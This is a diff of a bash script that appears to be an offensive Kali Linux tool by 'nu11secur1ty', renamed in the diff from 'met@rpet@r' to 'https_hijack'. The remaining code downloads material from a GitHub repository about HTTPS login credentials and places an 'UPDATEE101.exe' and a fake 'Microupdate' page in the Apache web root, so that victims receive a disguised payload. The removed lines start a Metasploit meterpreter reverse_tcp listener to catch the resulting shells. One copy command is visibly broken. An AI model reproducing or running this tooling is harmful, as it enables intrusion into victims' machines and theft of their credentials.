@@ -20,7 +20,7 @@ echo -e '\e[1;32m
        +#++#+    +#+    +#+    +#+       +#++#+     +#+  +#+    +#+    +#+ 
 #+#    #+##+#    #+#    #+#    #+#       #+##+#     #+# #+#     #+#    #+# 
 ######## ###    #################       ######     ############ ######## 
-					For (Kali Linux) code name met@rpet@r
+					For (Kali Linux) code name https_hijack
  						\e[1;34m
 					by nu11secur1ty
                            
@@ -33,12 +33,7 @@ If you do not want to use the program, please press Ctrl+C to exit.
 [5]         - Cleaning
 '
 
-service postgresql start
-
-exe='1'
-apk='2'
-py='3'
-jar='4' 
+exe='1' 
 cl='5'
 
 read x
@@ -50,9 +45,6 @@ wget https://github.com/nu11secur1ty/SSTC-HTTPS-login-credentials/raw/master/hos
 cp  > UPDATEE101.exe /var/www/html
 	cp -avr shimazu_module/Microupdate/* /var/www/html
 	systemctl start apache2.service
-echo -e 'Waiting for listener...'
-msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
 
 # 5	
 elif [ "$x" == "$cl" ]; then
